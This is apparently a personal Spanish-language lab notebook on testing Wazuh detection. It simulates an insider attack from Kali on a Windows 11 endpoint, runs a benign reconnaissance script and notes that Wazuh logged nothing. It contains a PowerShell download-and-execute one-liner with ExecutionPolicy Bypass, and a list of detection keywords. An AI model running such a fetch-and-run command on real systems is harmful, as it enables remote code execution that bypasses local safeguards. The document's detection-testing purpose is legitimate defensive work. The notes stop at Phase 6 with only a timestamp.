# El objetivo NO es comprometer, sino generar señales claras y detectables en Wazuh.

## Escenario del ataque (resumen) 
Atacante: Kali Linux  
Víctima: Windows 11 con agente Wazuh  
Detección: Wazuh  
Técnica: PowerShell sospechoso + intento de credential access  

### Simular:  
Un atacante interno que intenta ejecutar comandos remotos contra un endpoint Windows usando PowerShell.

### FASE 1 — Comprobaciones desde Kali
#### localizamos nuestra ip en kali y comprobamos conexion a la red
>ip a
todo correcto , tenemos ip
#### la ip de mi windows es 120, vamos a ver si lo "vemos" con un ping
>ping 192.168.1.120
todo correcto, seguimos para bingo


### FASE 2 — Preparar el payload (muy importante)
#### más importante, qué leche es un payload ? es la carga maliciosa , a diferencia del exploit, el exploit es cómo llegan los malos, y el payload es el código malicioso que cargan 

Vamos a usar PowerShell porque:  
Suele ser común en ataques , lo debería detectar wazuh y sobre todo no necesitaremos malware :D 
En Kali 
> nano recon.ps1  

editamos este archivo con el siguiente contenido ...

>Get-LocalUser
>Get-Process
>Get-Service

Lo guardamos

### FASE 3 — Servir el script desde Kali, montamos un servidor muy sencillo con python
>python3 -m http.server 8080
dejamos esa terminal abierta , para que permanezca a la "escucha" :D 

### FASE 4 — Ejecución desde Windows 11 (aquí viene lo bueno)
en w11, abrimos powershell y escribimos esto :

>powershell -ExecutionPolicy Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.30:8080/recon.ps1')"
192.168.1.30 es la ip de KALI , IMPORTANTE
le estamos diciendo a w11 que descargue un codigo malicioso de esta malvada web :D 

#### Esto es muy importante:
ExecutionPolicy Bypass → red flag para wazuh !!
Descarga remota
Ejecución inmediata

### FASE 5 — Qué buscar en Wazuh (detección)
En Wazuh → Explore → Discover

Busco por:  
powershell  
ExecutionPolicy  
Net.WebClient  
DownloadString  

qué pasa ? que no sale nada, no se ha visto el evento .... qué pasa ?¿?   
por qué wazuh no ha visto el evento , se ha descargado un payload y no se ha registrado ....  
  
esto hay que estudiarlo, qué ha pasado !!!  

### FASE 6 - Qué ha pasado con wazuh y por qué no ha detectado la ejecución de powershell
20260128-1307 TIMESTAMP mio 
